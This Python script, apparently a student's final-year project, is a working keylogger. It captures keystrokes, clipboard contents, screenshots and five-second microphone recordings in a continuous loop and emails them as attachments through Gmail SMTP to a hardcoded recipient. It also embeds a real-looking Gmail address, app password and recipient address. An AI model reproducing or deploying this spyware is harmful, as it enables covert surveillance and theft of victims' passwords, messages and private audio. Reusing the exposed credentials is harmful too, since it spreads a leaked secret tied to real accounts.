import os
import time
import smtplib
import pyperclip
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import sounddevice as sd
import numpy as np
from scipy.io.wavfile import write

# File paths
file_path = "D:\\FINALYR PROJECT\\advanced-keylogger\\MyKelogger"

# Create directory if it doesn't exist
os.makedirs(file_path, exist_ok=True)

keys_information = os.path.join(file_path, "key_log.txt")
clipboard_information = os.path.join(file_path, "clipboard.txt")
audio_information = os.path.join(file_path, "audio.wav")
screenshot_information = os.path.join(file_path, "screenshot.png")

# Email configuration
email_address = "suprionath2001@gmail.com"  # Replace with your email
password = "mtxu mtjm xbqv kkay"  # Replace with your app-specific password
toaddr = "shiva.sn1426@gmail.com"  # Replace with recipient's email

keys = []
count = 0

def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    if count >= 1:
        count = 0
        write_file(keys)
        keys.clear()

def write_file(keys):
    try:
        with open(keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write(' ')
                elif k.find("Key") == -1:
                    f.write(k)
    except Exception as e:
        print(f"Error writing to key log file: {e}")

def on_release(key):
    if key == Key.esc:
        return False

def get_clipboard_content():
    try:
        clipboard_content = pyperclip.paste()
        with open(clipboard_information, "w") as f:
            f.write(clipboard_content)
    except Exception as e:
        print(f"Error getting clipboard content: {e}")

def take_screenshot():
    try:
        im = ImageGrab.grab()
        im.save(screenshot_information)
    except Exception as e:
        print(f"Error taking screenshot: {e}")

def record_audio():
    try:
        fs = 44100
        seconds = 5
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2, dtype='float32')
        sd.wait()
        # Convert to int16 for compatibility with scipy.io.wavfile
        myrecording = (myrecording * 32767).astype(np.int16)
        write(audio_information, fs, myrecording)
    except Exception as e:
        print(f"Error recording audio: {e}")

def send_email_with_attachments(subject, body, attachments):
    try:
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject
        
        msg.attach(MIMEText(body, 'plain'))
        
        for filename in attachments:
            if os.path.exists(filename):
                try:
                    with open(filename, 'rb') as attachment:
                        part = MIMEBase('application', 'octet-stream')
                        part.set_payload(attachment.read())
                        encoders.encode_base64(part)
                        part.add_header('Content-Disposition', f"attachment; filename= {os.path.basename(filename)}")
                        msg.attach(part)
                except Exception as e:
                    print(f"Error attaching file {filename}: {e}")
        
        with smtplib.SMTP('smtp.gmail.com', 587) as s:
            s.starttls()
            s.login(fromaddr, password)
            s.sendmail(fromaddr, toaddr, msg.as_string())
            print("Email sent successfully")
    except Exception as e:
        print(f"Error sending email: {e}")

def main():
    try:
        print("Starting keylogger...")
        # Create initial empty files if they don't exist
        for file in [keys_information, clipboard_information]:
            if not os.path.exists(file):
                with open(file, 'w') as f:
                    pass

        listener = Listener(on_press=on_press, on_release=on_release)
        listener.start()
        
        while True:
            try:
                time.sleep(5)  # Wait for 5 seconds
                get_clipboard_content()
                take_screenshot()
                record_audio()
                
                attachments = [
                    keys_information,      # Key log file
                    clipboard_information, # Clipboard content
                    audio_information,     # Recorded audio
                    screenshot_information  # Screenshot
                ]
                
                # Prepare email subject and body
                subject = "Keylogger Data"
                body = "Please find attached the key log, clipboard content, audio recording, and screenshot."
                
                # Send email with attachments
                send_email_with_attachments(subject, body, attachments)
            except Exception as e:
                print(f"Error in main loop: {e}")
    except Exception as e:
        print(f"Error starting keylogger: {e}")

if __name__ == "__main__":
    main()